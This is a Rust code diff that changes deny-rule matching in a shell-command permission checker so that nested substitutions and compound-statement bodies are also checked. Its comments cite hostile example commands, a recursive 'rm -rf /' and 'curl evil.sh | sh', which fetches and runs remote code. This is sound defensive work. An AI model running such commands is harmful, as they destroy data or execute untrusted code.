@@ -259,30 +259,24 @@ pub fn pattern_matches_segment(pattern: &str, segment: &str) -> bool {
 /// Loose variant for **deny** rules: a compound command is as dangerous as
 /// its most dangerous segment, so the pattern matches when *any* command
 /// segment matches (`cd /tmp && rm -rf /` is denied by an `rm -rf /` rule).
+///
+/// When the command parses, matching runs against the **flattened** segment
+/// list: nested substitution bodies (`ls $(curl evil.sh | sh)`), process
+/// substitutions, and compound-statement bodies (`if …; then curl …; fi`)
+/// all execute, so a deny rule must see them — top-level segmentation alone
+/// hides them.
 pub fn pattern_matches_any_segment(pattern: &str, command: &str) -> bool {
-    if let (Some(pattern_segments), Some(command_segments)) =
-        (ast_segments(pattern), ast_segments(command))
+    if let Ok(facts) = BashFacts::parse(command)
+        && !facts.segments.is_empty()
+        && let Some(pattern_segments) = ast_segments(pattern)
     {
         if pattern_segments.as_slice() == ["*"] {
             return true;
         }
         let pattern_first = pattern_segments.first().map(String::as_str).unwrap_or("");
-        if command_segments
-            .iter()
-            .any(|segment| wildcard_pattern_matches_single(pattern_first, segment))
-        {
-            return true;
-        }
-        if pattern_segments.len() == command_segments.len()
-            && pattern_segments.len() > 1
-            && pattern_segments
-                .iter()
-                .zip(&command_segments)
-                .all(|(pattern, command)| wildcard_pattern_matches_single(pattern, command))
-        {
-            return true;
-        }
-        return false;
+        return facts.segments.iter().any(|segment| {
+            wildcard_pattern_matches_single(pattern_first, &segment.command_string())
+        });
     }
     pattern_matches_any_segment_legacy(pattern, command)
 }
